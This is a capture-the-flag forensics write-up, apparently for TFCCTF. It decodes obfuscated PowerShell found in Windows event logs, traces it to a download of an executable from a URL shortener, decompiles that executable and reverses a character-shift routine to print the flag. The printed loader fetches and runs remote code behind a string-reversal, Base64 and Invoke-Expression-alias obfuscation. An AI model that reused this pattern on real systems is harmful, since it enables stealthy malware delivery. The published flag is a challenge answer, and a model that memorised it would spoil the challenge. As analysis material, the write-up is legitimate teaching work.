<img src="https://github.com/raul-dunca/assets/blob/main/.images/he_did_what.png?raw=true">

In the `.evtx` file, I discovered very few PowerShell events which seemed obfuscated and suspicious. Putting the commands together results in:

```shell
.\caca.exe "VHEEVH}x3uwcnad6u3eac3pvaj6tf"
$uqR = "i"+"N"+"V"+"o"+"k"+"e"+"-"+"E"+"X"+"p"+"r"+"E"+"S"+"S"+"i"+"O"+"n" ; NEW-aLIaS -naME pWN -VaLuE $uqR -FORCe ; PWN $SCr ;
$SCr = [SyStem.TexT.encODINg]::uTF8.GeTsTrInG([SYSteM.coNVErT]::froMBaSe64STrinG("$w9r4pBoZlnfIzH1keCtX")) ;
$w9r4pBoZlnfIzH1keCtX = $FBtFFDr8NXp5.ToCharArray() ; [array]::Reverse($w9r4pBoZlnfIzH1keCtX) ; -join $w9r4pBoZlnfIzH1keCtX 2>&1> $null ;
$FBtFFDr8NXp5 = "=oQDiUGel5SYjF2YiASZslmR0V3TtASKpkiI90zZhFDbuJGc5MEZoVzQilnVIRWe5cUY6lTeMZTTINGMShUYigyZulmc0NFN2U2chJUbvJnR6oTX0JXZ252bD5SblR3c5N1WocmbpJHdTRXZH5COGRVV6oTXn5Wak92YuVkL0hXZU5SblR3c5N1WoASayVVLgQ3clVXclJlYldVLlt2b25WS";
```
To decode the value of `$FBtFFDr8NXp5`, I followed the commands in opposite order: first I reversed the string and then decoded it in CyberChef using the `From Base64` function. This will reveal:

```shell
Invoke-WebRequest -Uri ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cHM6Ly9zaG9ydHVybC5hdC9pbnl1ag=="))) -OutFile "caca.exe"
```


Here is again a Base64 string `aHR0cHM6Ly9zaG9ydHVybC5hdC9pbnl1ag==` which after decoding becomes `https://shorturl.at/inyuj` .

Going to the link, you can download the executable used above in the obfuscated code. Running this program or putting it in Ghidra reveals nothing about its functionality. However, assuming it was probably C# I also tried to put the program in `dnSpy`. There I found the following code::

```C#
public static void td4306d885b1c98544112b830f9bd97c6()
	{
		string str = "";
		string text = "TFCCTF{fake_flag_haha}";
		int num = Strings.Len(text);
		checked
		{
			for (int i = 1; i <= num; i++)
			{
				str += Conversions.ToString(Strings.Chr(Strings.Asc(Strings.Mid(text, i, 1)) + 2));
			}
		}
	}
```

Running it reveals something similar to the parameter found in the event logs: `VHEEVH}x3uwcnad6u3eac3pvaj6tf`, thus I assumed this is some kind of "encryption" so I reversed the logic:

```C#
public static void Main(string[] args)
    {
        string str = "VHEEVH}x3uwcnad6u3eac3pvaj6tf"; 
        string result = "";
        int num = str.Length;
        for (int i = 0; i <num; i++)
        {
            result += ((char)(str[i] - 2)).ToString();
        }
        
        Console.WriteLine(result);
    }
```

`TFCCTF{v1sual_b4s1c_a1nt_h4rd}`
